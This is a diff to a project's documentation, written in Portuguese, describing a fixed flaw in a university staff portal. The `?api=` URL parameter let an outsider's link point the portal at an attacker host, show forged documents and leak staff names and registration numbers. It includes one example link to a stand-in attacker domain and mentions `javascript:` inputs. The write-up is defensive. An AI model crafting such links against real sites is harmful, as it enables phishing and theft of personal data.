@@ -390,6 +390,34 @@ Janela padrão de 180 dias, whitelist `[30, 90, 180, 365]` — a entrada nunca �
 interpolada no SQL. A rota degrada com `indisponivel: true` se as tabelas do
 núcleo analítico não existirem, em vez de dar 500.
 
+## Nada que venha da URL escolhe origem de dados
+
+**`?api=` só vale em localhost, e isso é segurança.** Até 06/08/2026 ele aceitava
+qualquer valor (`src/config.ts`), então um único link
+
+    https://<portal>/?api=https://atacante.example        <!-- hash-exemplo -->
+
+fazia o portal inteiro ler daquela origem e exibir **atos forjados com a
+identidade visual da UFF**. E há um agravante que o torna pior que
+desinformação: a aba **Meu SIAPE ENVIA a matrícula e o nome digitados** para
+`API_BASE` — o mesmo link vazaria o dado pessoal de quem clicasse, justamente na
+aba de maior uso e cujo público é o servidor procurando o próprio registro.
+
+A regra agora: o override só é aceito quando a **página** está em localhost **e**
+o **alvo** é localhost. Preserva o `?api=http://127.0.0.1:8900` do mock e mata o
+vetor em produção, onde a API é sempre a do próprio domínio. Medido em 9 casos,
+inclusive `//atacante.example` (protocolo-relativo) e `javascript:` — os dois
+caem. Configuração legítima de implantação continua por `window.__API_BASE__`,
+que vem do HTML servido e **não é forjável por link**. Trava em
+`tools/test_redesign_integrity.mjs`.
+
+**A regra geral que fica:** valor vindo da URL — query ou hash — é entrada de
+terceiro. Serve para *escolher entre opções que o código já conhece* (a aba, um
+filtro), nunca para *definir de onde vêm os dados* nem para ser interpolado em
+HTML. O hash é seguro hoje porque é conferido contra `ABAS_VALIDAS` e o eco na
+mensagem de erro sai por JSX (`{erro}`), que o React escapa — não use
+`dangerouslySetInnerHTML` com ele.
+
 ## URL por aba (roteamento por hash)
 
 Cada aba tem uma URL própria via **fragmento** — a forma canônica é
